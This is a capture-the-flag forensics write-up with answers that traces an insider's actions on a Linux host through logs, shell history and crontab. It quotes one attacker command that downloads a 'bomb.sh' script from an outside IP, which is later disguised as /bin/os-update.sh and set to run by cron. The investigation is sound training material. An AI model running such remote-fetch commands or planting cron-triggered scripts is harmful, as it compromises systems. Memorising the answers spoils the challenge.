# Disgruntled
---

## 1. 📦 What command was used to install a package using elevated privileges?

**Method**:  
We checked the sudo history in the `auth.log` file:

```bash
cd /var/log
cat auth.log | grep install
```
Answer:
/usr/bin/apt install dokuwiki

2. 📁 What was the present working directory (PWD) when the previous command was run?
Method:
From the same auth.log entry, we observed the user's current directory at the time of command execution.

Answer:
/home/cybert

3. 👤 Which user was created after the package was installed?
Method:
We searched for adduser events in auth.log:

cat auth.log | grep adduser
Answer: it-admin

4. 🛠️ A user was later given sudo privileges. When was the sudoers file updated?
Method:
Manual inspection of auth.log for entries where the sudoers file was modified.

Answer: Dec 28 06:27:34

5. 📜 A script file was opened using the vi text editor. What is the name of this file?
Method:
By browsing through auth.log, we located the command used to open a suspicious file with vi.

Answer: bomb.sh

6. 🌐 What is the command used that created the file bomb.sh?
Method:
Checked the .bash_history file in the it-admin user's home directory:

cat /home/it-admin/.bash_history
Answer: curl 10.10.158.38:8080/bomb.sh --output bomb.sh

7. 🚚 The file was renamed and moved. What is the full new path of this file?
Method:
We examined .viminfo to view vi editor history and observed the new path of the renamed script.

Answer: /bin/os-update.sh

8. 🕒 When was the file from the previous question last modified?
Method:
Used ls -l or stat to check the modification time of the file:

stat /bin/os-update.sh
Answer: Dec 28 06:29

9. 📄 What file will be created when os-update.sh executes?
Method:
Opened the script in a text editor and reviewed its contents:

nano /bin/os-update.sh
Answer: goodbye.txt

10. ⏰ At what time will the malicious script be triggered?
Method:
Inspected the crontab to see scheduled tasks:

crontab -l
Answer: 08:00 AM
